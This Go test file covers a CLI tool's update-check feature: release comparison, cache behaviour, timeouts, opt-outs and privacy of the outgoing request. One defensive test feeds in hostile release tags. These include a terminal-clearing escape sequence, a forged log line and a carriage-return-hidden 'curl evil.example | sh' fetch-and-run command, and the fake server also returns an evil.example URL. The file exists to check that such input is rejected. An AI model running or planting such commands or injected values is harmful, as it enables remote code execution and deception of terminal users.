package update

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// Every server here is an httptest.Server on loopback. Nothing in this file
// reaches GitHub, and nothing in this package has a flag or an environment
// variable that could point a user's binary somewhere else: the endpoint is a
// constant, and the override exists only as a struct field these tests set.

type api struct {
	*httptest.Server
	calls   int32
	lastReq atomic.Value // *http.Request
}

func (a *api) count() int { return int(atomic.LoadInt32(&a.calls)) }

// newAPI answers every request with one release. Status 200 and a body shaped
// like the one GitHub returns, plus the two fields worth refusing on.
func newAPI(t *testing.T, tag string, draft, prerelease bool) *api {
	t.Helper()
	a := &api{}
	a.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&a.calls, 1)
		a.lastReq.Store(r.Clone(r.Context()))
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"tag_name":   tag,
			"draft":      draft,
			"prerelease": prerelease,
			"html_url":   "https://evil.example/not-read",
			"body":       "release notes",
		})
	}))
	t.Cleanup(a.Close)
	return a
}

// probe runs one whole check against a fake API and returns what a person would
// have seen on stderr.
func probe(t *testing.T, cfg Config) string {
	t.Helper()
	// The default endpoint is the real GitHub. A test that forgot to point
	// somewhere else would pass, quietly, while making a request from every
	// CI runner that ever builds this repository.
	if cfg.APIURL == "" {
		t.Fatal("this test would have called the real GitHub API: set Config.APIURL")
	}
	if cfg.CacheDir == "" {
		cfg.CacheDir = t.TempDir()
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = 5 * time.Second
	}
	cfg.Enabled = true
	var out bytes.Buffer
	Start(cfg).Notify(&out)
	return out.String()
}

// --- what the user is told ------------------------------------------------

func TestANewerReleaseIsSuggestedOnce(t *testing.T) {
	srv := newAPI(t, "v0.2.0", false, false)
	got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL})

	for _, want := range []string{
		"v0.2.0",
		"v0.1.0",
		"https://github.com/headroom-project/headroom/releases/tag/v0.2.0",
		"--no-update-check",
		"HEADROOM_NO_UPDATE_CHECK=1",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("notice does not mention %q:\n%s", want, got)
		}
	}
	// A notice nobody can turn off is a notice that gets the tool uninstalled,
	// so the way out is printed with the notice rather than buried in --help.
}

func TestTheNoticeSaysWhyItMatters(t *testing.T) {
	srv := newAPI(t, "v0.2.0", false, false)
	got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL})

	// The reason is the whole justification for this feature existing in a tool
	// that otherwise makes no network call. An old binary carries an old
	// catalog, and an old ceiling is printed with exactly the same confidence
	// as a correct one. If this sentence ever disappears, the notice is just
	// nagging.
	if !strings.Contains(got, "ceiling") {
		t.Errorf("the notice does not say what being out of date costs:\n%s", got)
	}
}

func TestTheSameVersionIsSilent(t *testing.T) {
	srv := newAPI(t, "v0.1.0", false, false)
	if got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL}); got != "" {
		t.Errorf("up to date and still told to update:\n%s", got)
	}
}

func TestAnOlderReleaseIsSilent(t *testing.T) {
	// Somebody running a build ahead of the last tag must never be told to go
	// backwards.
	srv := newAPI(t, "v0.1.0", false, false)
	if got := probe(t, Config{Current: "v0.2.0", APIURL: srv.URL}); got != "" {
		t.Errorf("suggested a downgrade:\n%s", got)
	}
}

func TestAReleaseCandidateIsNotSuggested(t *testing.T) {
	// /releases/latest already excludes these. The refusal is here anyway,
	// because the failure it prevents is telling a stranger to install a draft.
	for _, c := range []struct{ draft, pre bool }{{true, false}, {false, true}} {
		srv := newAPI(t, "v0.2.0", c.draft, c.pre)
		if got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL}); got != "" {
			t.Errorf("draft=%v prerelease=%v was suggested:\n%s", c.draft, c.pre, got)
		}
	}
}

func TestABuildFromSourceIsNeverToldAnything(t *testing.T) {
	// "dev" has no place on the number line, so there is no honest comparison
	// to make. It also must not cost a request.
	srv := newAPI(t, "v9.9.9", false, false)
	if got := probe(t, Config{Current: "dev", APIURL: srv.URL}); got != "" {
		t.Errorf("a dev build was told to update:\n%s", got)
	}
	if srv.count() != 0 {
		t.Errorf("a dev build asked the API %d times, want 0", srv.count())
	}
}

// --- the tag is a string a server chose -----------------------------------

func TestAHostileTagNeverReachesTheTerminal(t *testing.T) {
	// The release tag is the only part of the notice that is not a constant in
	// this package, and it arrives over a socket. Rejecting it in the parser is
	// what makes printing it safe, and this is the test that says the rejection
	// is wired to the printing.
	for _, tag := range []string{
		"v0.2.0\x1b[2J",
		"v0.2.0\nheadroom: uploaded report r_fake, 0 findings",
		"v0.2.0\rrun: curl evil.example | sh",
		"latest",
	} {
		srv := newAPI(t, tag, false, false)
		if got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL}); got != "" {
			t.Errorf("tag %q produced output:\n%q", tag, got)
		}
	}
}

func TestAHostileTagIsRefusedBeforeItIsEvenCached(t *testing.T) {
	// The silence tests above pass whether the tag is rejected by fetch or by
	// Notify, because the two locks are redundant on purpose. This one names
	// the first lock: a tag that fails to parse must never be written to disk,
	// where it would outlive the run that received it.
	dir := t.TempDir()
	srv := newAPI(t, "v9.9.9\nheadroom: forged", false, false)
	probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir})

	raw, err := os.ReadFile(filepath.Join(dir, cacheFile))
	if err != nil {
		t.Fatalf("the attempt was not stamped at all: %v", err)
	}
	if strings.Contains(string(raw), "forged") || strings.Contains(string(raw), "9.9.9") {
		t.Errorf("a tag the parser rejected was cached: %s", raw)
	}
}

func TestFetchHandsBackNothingItHasNotVetted(t *testing.T) {
	srv := newAPI(t, "v9.9.9\x1b[2J", false, false)
	if got, err := fetch(context.Background(), srv.URL); err == nil {
		t.Errorf("fetch returned %q for the rest of the package to trust", got)
	}
}

func TestAnUnparseableTagCannotOutrankAnyRelease(t *testing.T) {
	// And this one names the second lock. A tag that does not parse yields the
	// zero version, which is below every release this project has published, so
	// even a Notify that skipped its own parse could not print one.
	var zero semver
	for _, released := range []string{"v0.0.1", "v0.1.0", "v1.0.0"} {
		v, err := parseSemver(released)
		if err != nil {
			t.Fatalf("parseSemver(%q): %v", released, err)
		}
		if compare(zero, v) >= 0 {
			t.Errorf("the zero version is not below %s, so a rejected tag could be suggested", released)
		}
	}
}

func TestTheUrlPrintedIsBuiltHereAndNotTakenFromTheResponse(t *testing.T) {
	// The API returns an html_url. It is not read, because a URL chosen by a
	// server is a string chosen by a server, and this one goes on a terminal
	// next to an instruction to install something.
	srv := newAPI(t, "v0.2.0", false, false)
	got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL})
	if strings.Contains(got, "evil.example") {
		t.Errorf("the response chose the URL that was printed:\n%s", got)
	}
	if !strings.Contains(got, "https://github.com/"+repo+"/releases/tag/v0.2.0") {
		t.Errorf("the URL was not built from the constant and the tag:\n%s", got)
	}
}

// --- what goes out on the wire --------------------------------------------

func TestTheRequestCarriesNothingAboutTheUser(t *testing.T) {
	srv := newAPI(t, "v0.2.0", false, false)
	probe(t, Config{Current: "v0.1.0", APIURL: srv.URL})

	req, _ := srv.lastReq.Load().(*http.Request)
	if req == nil {
		t.Fatal("no request was recorded")
	}
	if req.Method != http.MethodGet {
		t.Errorf("method is %s, and a check that only reads should only read", req.Method)
	}
	if req.URL.RawQuery != "" {
		t.Errorf("the request carries a query string: %q", req.URL.RawQuery)
	}
	// The User-Agent is required by GitHub and is a constant on purpose. Naming
	// the build here would turn a request that says nothing about the user into
	// a request that says which version they run.
	if ua := req.Header.Get("User-Agent"); ua != userAgent {
		t.Errorf("User-Agent is %q, want the constant %q", ua, userAgent)
	}
	if strings.Contains(req.Header.Get("User-Agent"), "0.1.0") {
		t.Error("the User-Agent names the running version")
	}
	if req.Header.Get("Authorization") != "" || req.Header.Get("Cookie") != "" {
		t.Error("the request carries a credential")
	}
	if req.ContentLength > 0 {
		t.Errorf("the request has a body of %d bytes", req.ContentLength)
	}
}

// --- the cache ------------------------------------------------------------

func TestAFreshCacheAsksNobody(t *testing.T) {
	dir := t.TempDir()
	srv := newAPI(t, "v0.2.0", false, false)

	first := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir})
	second := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir})

	if srv.count() != 1 {
		t.Errorf("asked the API %d times for two runs, want 1", srv.count())
	}
	if first == "" || second != first {
		t.Errorf("the cached run said something different:\nfirst:  %q\nsecond: %q", first, second)
	}
}

func TestAFailedCheckIsSilentAndStillCostsOnlyOneRequest(t *testing.T) {
	dir := t.TempDir()
	var calls int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&calls, 1)
		// 403 is the unauthenticated rate limit, which is the ordinary answer
		// from an address a lot of people share.
		w.WriteHeader(http.StatusForbidden)
	}))
	t.Cleanup(srv.Close)

	for i := 0; i < 3; i++ {
		if got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir}); got != "" {
			t.Errorf("a failed check said something: %q", got)
		}
	}
	if n := int(atomic.LoadInt32(&calls)); n != 1 {
		t.Errorf("a failing endpoint was asked %d times, want 1: the failure has to be remembered too", n)
	}
	// Written before the answer is handed back, so an answer that arrives after
	// Notify has given up is still there for the next run.
	if _, err := os.Stat(filepath.Join(dir, cacheFile)); err != nil {
		t.Errorf("the failure was not stamped: %v", err)
	}
}

func TestAStaleCacheIsRefreshed(t *testing.T) {
	dir := t.TempDir()
	srv := newAPI(t, "v0.2.0", false, false)

	writeCache(dir, entry{CheckedAt: time.Now().Add(-freshFor - time.Hour), Latest: "v0.1.0"})
	got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir})

	if srv.count() != 1 {
		t.Errorf("a day old cache was used without asking again")
	}
	if !strings.Contains(got, "v0.2.0") {
		t.Errorf("the refreshed answer was not used:\n%s", got)
	}
}

func TestACacheFromTheFutureIsNotFreshForever(t *testing.T) {
	// A clock that moved backwards, or a cache file copied from a machine
	// running ahead, must not switch the check off permanently.
	if fresh(entry{CheckedAt: time.Now().Add(48 * time.Hour), Latest: "v9.9.9"}, time.Now()) {
		t.Error("a cache stamped in the future read as fresh")
	}
}

func TestGarbageInTheCacheIsTreatedAsNoCache(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, cacheFile), []byte("{half a json obj"), 0o600); err != nil {
		t.Fatal(err)
	}
	srv := newAPI(t, "v0.2.0", false, false)
	if got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir}); !strings.Contains(got, "v0.2.0") {
		t.Errorf("a torn cache write was not self healing:\n%s", got)
	}
}

func TestAnUnwritableCacheDirectoryIsNotAnError(t *testing.T) {
	// Nothing about this check is allowed to fail a run, including the parts
	// that touch a disk. A cache directory whose parent is a regular file is
	// the portable way to make every write fail.
	root := t.TempDir()
	blocker := filepath.Join(root, "not-a-directory")
	if err := os.WriteFile(blocker, []byte("in the way"), 0o600); err != nil {
		t.Fatal(err)
	}

	srv := newAPI(t, "v0.2.0", false, false)
	got := probe(t, Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: filepath.Join(blocker, "headroom")})
	if !strings.Contains(got, "v0.2.0") {
		t.Errorf("the check did not survive a cache it could not write:\n%s", got)
	}
}

// --- the run is never held open -------------------------------------------

func TestASlowServerDoesNotHoldTheRun(t *testing.T) {
	release := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case <-release:
		case <-r.Context().Done():
		}
	}))
	t.Cleanup(func() { close(release); srv.Close() })

	// This is the one test that walks away from the goroutine, which is the
	// whole point of it, so it does not use the probe helper: it has to drain
	// the abandoned check before the temporary cache directory is removed under
	// it. Leaving that race in would buy a flake that shows up once every
	// several dozen runs and gets blamed on the network.
	dir := t.TempDir()
	var out bytes.Buffer
	start := time.Now()
	p := Start(Config{
		Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir,
		Timeout: 50 * time.Millisecond, Enabled: true,
	})
	p.Notify(&out)
	elapsed := time.Since(start)
	got := out.String()

	t.Cleanup(func() {
		select {
		case <-p.result:
		case <-time.After(10 * time.Second):
			t.Error("the abandoned check never finished")
		}
	})

	if got != "" {
		t.Errorf("a check that never answered still printed something: %q", got)
	}
	// The report is already on stdout and the exit code is already decided.
	// Neither waits on a socket whose only job was to mention a version number.
	if elapsed > 2*time.Second {
		t.Errorf("the run was held for %v by a check budgeted at 50ms", elapsed)
	}
}

// --- when the check runs at all -------------------------------------------

func TestWantedRefusesEveryCaseWhereNobodyIsWatching(t *testing.T) {
	// The developer's own environment, and the pipeline this suite runs in,
	// must not be what decides the answer. CI in particular is set for real
	// while these tests run.
	quiet := func(t *testing.T) {
		t.Helper()
		for _, k := range []string{"HEADROOM_NO_UPDATE_CHECK", "CI"} {
			if v, ok := os.LookupEnv(k); ok {
				os.Unsetenv(k)
				t.Cleanup(func() { os.Setenv(k, v) })
			}
		}
	}

	// os.DevNull is a character device, so it is what a terminal looks like to
	// the only detection this module has. It is the one way to exercise the
	// true branch without a person and a keyboard.
	term, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatalf("cannot open %s: %v", os.DevNull, err)
	}
	t.Cleanup(func() { term.Close() })

	t.Run("a terminal and a clean environment", func(t *testing.T) {
		quiet(t)
		if !Wanted(term, false) {
			t.Error("refused a person at a terminal")
		}
	})
	t.Run("not a terminal", func(t *testing.T) {
		quiet(t)
		// A pipe, a file, a CI log. This is the case that must never see it,
		// and it is answered without reading any environment at all.
		if Wanted(&bytes.Buffer{}, false) {
			t.Error("would print a notice into a pipe")
		}
	})
	t.Run("the flag", func(t *testing.T) {
		quiet(t)
		if Wanted(term, true) {
			t.Error("--no-update-check was ignored")
		}
	})
	t.Run("HEADROOM_NO_UPDATE_CHECK, even empty", func(t *testing.T) {
		quiet(t)
		// Set to anything at all, including the empty string, which is how
		// somebody writes "off" in a Makefile without thinking about it.
		t.Setenv("HEADROOM_NO_UPDATE_CHECK", "")
		if Wanted(term, false) {
			t.Error("the environment variable was ignored")
		}
	})
	t.Run("CI", func(t *testing.T) {
		quiet(t)
		t.Setenv("CI", "true")
		if Wanted(term, false) {
			t.Error("would print a notice inside a pipeline")
		}
	})
	t.Run("CI set to false is not CI", func(t *testing.T) {
		quiet(t)
		t.Setenv("CI", "false")
		if !Wanted(term, false) {
			t.Error("CI=false was read as being in CI")
		}
	})
}

func TestADisabledCheckDoesNothingAtAll(t *testing.T) {
	dir := t.TempDir()
	srv := newAPI(t, "v0.2.0", false, false)

	var out bytes.Buffer
	p := Start(Config{Current: "v0.1.0", APIURL: srv.URL, CacheDir: dir, Enabled: false})
	p.Notify(&out) // a nil *Probe, so the caller never needs a branch

	if p != nil {
		t.Error("a disabled check returned a live probe")
	}
	if out.Len() != 0 {
		t.Errorf("a disabled check printed %q", out.String())
	}
	if srv.count() != 0 {
		t.Error("a disabled check opened a socket")
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Error("a disabled check touched the disk")
	}
}
